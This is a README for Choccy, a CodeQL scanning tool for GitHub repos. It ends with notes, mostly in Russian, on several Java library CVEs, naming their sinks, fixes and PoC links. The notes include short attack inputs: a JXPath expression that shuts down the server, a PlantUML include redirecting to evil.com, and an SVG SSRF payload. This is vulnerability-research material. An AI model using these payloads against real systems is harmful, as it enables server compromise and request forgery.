# Choccy
![icon](./web/public/favicon.ico)



## Introduction
Choccy is a project used to monitor updates to the GitHub repo and automatically perform CodeQL analysis scans on it.



## Start

You need to configure your own code compilation environment and CodeQL environment before running：

Download CodeQL binaries and libraries separately https://github.com/github/codeql-cli-binaries/releases, https://github.com/github/codeql/tags

After decompression, it is placed in the same directory as the Choccy binary file, that is,：

```
$ tree . -L 1
.
├── choccy
├── codeql
└── codeql-codeql-cli-v2.19.4
```





The main configuration and functions are in the Web interface, and there are only two command line parameters：

```
-addr string
      Listening address and port (default "0.0.0.0:80")
-token string
      System Token
```

The first time the program runs, it will create a `choccy_data` folder in its own directory to save the data. If you do not specify the token, it will be randomly generated and output to the command line. The project itself has potentially arbitrary command execution and file reading functions, so if the service is open to the public network, please be sure to set a strong password.



## Building

You need to first enter the web directory to compile the front-end, and the front-end resource files will be automatically embedded when compiling the golang back-end.

Simply run `./build.sh`, or alternatively

```shell
cd web
npm install
npm run build
cd ..
go build -o choccy main.go 

#Cross-compile on mac
#CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o choccy_linux_amd64 main.go
#CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o choccy_windows_amd64.exe main.go
#CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -o choccy_darwin_amd64 main.go
```





## Usage example

After building the application, start it and go to address on web browser, and enter system token.

Now you should see the main page
![image-mainpage](./README/image-mainpage.png)

Let's analyze CVE-2023-40826 for package org.pf4j:pf4j. Firstly we need CodeQL query kit.

Create file `choccy_data/suites/java_mine.qls` with the next content:
```
- description: java mine
- queries: .
  from: choccy/java
- include:
    tags contain: mine
```

Next, create CodeQL query with needed tag in file `choccy_data/packs/java/sinks/ZipSlipMine.ql` with the next content:
```
/**
 * @name Arbitrary file access during archive extraction ("Zip Slip")
 * @description Extracting files from a malicious ZIP file, or similar type of archive, without
 *              validating that the destination file path is within the destination directory
 *              can allow an attacker to unexpectedly gain access to resources.
 * @kind path-problem
 * @id java/zipslip
 * @problem.severity error
 * @security-severity 7.5
 * @precision high
 * @tags mine
 */

import java
import semmle.code.java.security.ZipSlipQuery
import ZipSlipFlow::PathGraph

from ZipSlipFlow::PathNode source, ZipSlipFlow::PathNode sink
where ZipSlipFlow::flowPath(source, sink)
select source.getNode(), source, sink,
  "Unsanitized archive entry, which may contain '..', is used in a $@.", sink.getNode(),
  "file system operation"
```

Now check that you have query kit `java_mine.qls` in the "Query Kit" tab
![image-querytab](./README/image-querytab.png)

Click on `java_mine.qls`, the kit should contain our CodeQL query
![image-queryjava](./README/image-queryjava.png)

Now let's add GitHub repository for scanning. Go back to "GitHub Project" tab and click on "+" icon. Fill in the fields

![image-fill](./README/image-fill.png)
![image-github-success](./README/image-github-success.png)

Click on the left button named "Join the scan queue" and go to "Task" tab
![image-task-zero](./README/image-task-zero.png)

Now we see that latest version have no ZipSlip vulnerabilities. Let's add custom built CodeQL database with older version. Supposing you already have the database for version v3.9.0, go to "Database tab" and press "+", and upload database
![image-upload-db](./README/image-upload-db.png)

Then go back to "Task" tab, press "+" and choose "Create from an existing database", and fill the fields
![image-custom-db](./README/image-custom-db.png)

Wait for the scan completion. You should see next
![image-scan-completion](./README/image-scan-completion.png)

Go to "Analysis results" tab and explore the results
![image-results](./README/image-results.png)


### Upload the CodeQL database for scanning

On the 'Database' page, click the plus icon in the upper right corner to package the local database as a zip archive, then upload, wait for the upload and import to complete (this page cannot be closed during the upload)

(The upload function does not use block transmission, so the available memory of the server is required to be greater than the file size)

![image-upload-db](./README/image-upload-db.png)

On the 'TASK' page, click the plus icon in the upper right corner, and select the database and query suite. The project name is the same as the database name by default.

![image-custom-db](./README/image-custom-db.png)


### Select GitHub projects in bulk for scanning

On the 'task' page, select the plus sign icon in the upper right corner and click 'Batch Create from GitHub`

![image-batch-github](./README/image-batch-github.png)

The 'search statement' is the retrieval of the warehouse. The syntax reference is: https://docs.github.com/en/rest/search/search?apiVersion=2022-11-28#search-repositories

'Scan range' refers to which part is taken out for scanning after being sorted in a certain order.In the screenshot below, it will be sorted in reverse order by the number of stars, and the 11th and 12th warehouses will be scanned.

![image-batch-fields](./README/image-batch-fields.png)


## CVE reports

### CVE: CVE-2022-41852

Package: commons-jxpath:commons-jxpath

CWE-470

Данная уязвимость опасна тем, что при запуске HTTP-сервера злоумышленник при отправке определенного запроса будет иметь возможность исполнить произвольный код на сервере.

При создании контекста `var pathContext = JXPathContext.newContext(person);` туда сохраняются все стандартные функции Java, и эту функцию можно вызвать, передав например запрос `<b>?path=java.lang.System.exit(42)</b>` и тогда сервер выключится.

Паблик метод у контекста по сути `pathContext.getValue(path)` (т.е. `org.apache.commons.jxpath.JXPathContext:getValue`), но функции создаются глужбе, в файле `JXPathContext.java`:
```
public abstract class JXPathContext {
    ...

    private static final PackageFunctions GENERIC_FUNCTIONS =
        new PackageFunctions("", null);

    ...
}
```

Sink находится в файле `PackageFunctions.java` и выглядит так:
```
functionClass = Class.forName(className);
```
т.е. метод `java.lang.Class:forName`

PoC находится по ссылке https://github.com/Warxim/CVE-2022-41852/tree/main

Коммита с исправлением по сути нету т.к. эту CVE не признали уязвимостью. Чтобы злоумышленник не мог исполнить произвольный код, нужно вызвать `pathContext.setFunctions(new FunctionLibrary());` и тогда из контекста нельзя будет достать произвольную функцию.

### CVE: CVE-2023-46442

Package: org.soot-oss:soot

CWE-835

Данная уязвимость опасна тем, что через бесконечный цикл злоумышленник может вызвать отказ сервиса (из-за большого потребления памяти).

Паблик метод `soot.SootMethod:retrieveActiveBody`, синк не найду

PoC лежит здесь https://github.com/JAckLosingHeart/CVE-2023-46442_POC/tree/main

### CVE: CVE-2018-12533

Package: org.richfaces:richfaces-core

CWE-917

Данная уязвимость опасна тем что позволяет произвести инъекцию кода и запустить на сервере произвольный Java код.

PoC https://github.com/llamaonsecurity/CVE-2018-12533/blob/master/src/main/java/cve_2018_12533/Main.java

Нету исходников со старым кодом, единственное что нашлось https://github.com/nuxeo/richfaces-3.3 опять не собирается база codeql. Из-за этого не могу найти sink и паблик метод.

### CVE: CVE-2023-3432

CWE-918

Package: PlantUML

Данная уязвимость опасна тем что позволяет перенаправлять запросы на другие сайты (например злоумышленника)

PoC находится здесь https://github.com/horizon3ai/CVE-2023-34362 и заключается в том чтобы запустить PlantUML с параметром `PLANTUML_SECURITY_PROFILE=ALLOWLIST` и установить url `-Dplantuml.allowlist.url=https://plantuml.com`, тогда следующая диаграмма будет перенаправлять запросы не на `https://plantuml.com` а на `https://evil.com`
```
@startuml
!include https://plantuml.com@evil.com
a -> b: %load_json()
@enduml
```

Sink https://github.com/plantuml/plantuml/blob/v1.2023.8/src/net/sourceforge/plantuml/security/SURL.java#L253 т.е. метод `java.util.regex.Pattern:compile`

Коммит с фиксом https://github.com/plantuml/plantuml/commit/b32500bb61ae617bb312496d6d832e4be8190797#diff-c39d9b156bb6f66caa73b1859ae2f15630567d52c1d19c30dbb955a53fe5ca0fR253

Фикс заключается в том что они подправили регэксп.

### CVE: CVE-2022-44729

CWE-918

Package: org.apache.xmlgraphics:batik-xml

Данная уязвимость также опасна тем что позволяет перенаправлять запросы на другие сайты (например злоумышленника)

PoC находится здесь https://psytester.github.io/Jira_SSRF_at_Batik_CVEs_PoC/

Его суть в том чтобы стриггерить Server-Side-Request-Forgery через SVG-теги `<image>, <tref>, <use>`:
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="450" height="500" viewBox="0 0 450 500">
	<text x="100" y="100" font-size="45" fill="blue" >
		image xlink:href SSRF attack
	</text>
    	<image width="50" height="50" xlink:href="jar:http://127.0.0.1:8067/some-internal-resource?poc_triggered_tag=image!/"></image>
</svg>
```

Я создал базу на версии `batik-1.16` и запустил через codeql, но оно не находит уязвимости.

### CVE: CVE-2021-21479

Package: com.sap.scimono:scimono-server

CWE-74

Данная уязвимость позволяет заинжектить java expression 

Невозможно найти исходники библиотеки, в гитхабе https://github.com/SAP/scimono вообще только один релиз

PoC тоже не находится

### CVE: CVE-2024-36522

Package: org.apache.wicket:wicket-util

CWE-74

Данная уязвимость опасна тем что позволяет произвести удаленное исполнение произвольного кода через XSLT-инъекцию

PoC не находится

Паблик метод (по сути конструктор стрима) `	public XSLTResourceStream(final IResourceStream xsltResource, final IResourceStream xmlResource)`, т.е. `org.apache.wicket.wicket-util.XSLTResourceStream:constructor`

Sink `javax.xml.transform.stream:StreamSource`

Фикс: https://github.com/apache/wicket/compare/rel/wicket-10.0.0...rel/wicket-10.1.0

По сути они добавили `TransformerFactory` и сделали стандартный, в котором выставляют настройку безопасности `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);`

### CVE: CVE-2023-39010

Package: org.boofcv:ip

CWE-94

Данная уязвимость опасна тем что позволяет отправить вредоносный YAML как конфиг для калибровки камеры и с помощью этого произвести arbitrary code injection.

Паблик метод `boofcv.io.calibration.CalibrationIO:load`

Sink `java.util.regex.Pattern:compile`

PoC не находится

Проблем по сути в парсинге регэкспа ямла.

Фикс https://github.com/lessthanoptimal/BoofCV/compare/v0.43...v0.44 теперь они конструируют YAML через SafeConstructor:
```
return new Yaml(new SafeConstructor(new LoaderOptions()), new Representer(dumperOptions),
				dumperOptions, loaderOptions);

...

var yaml = new Yaml(new SafeConstructor(new LoaderOptions()), representer);
```

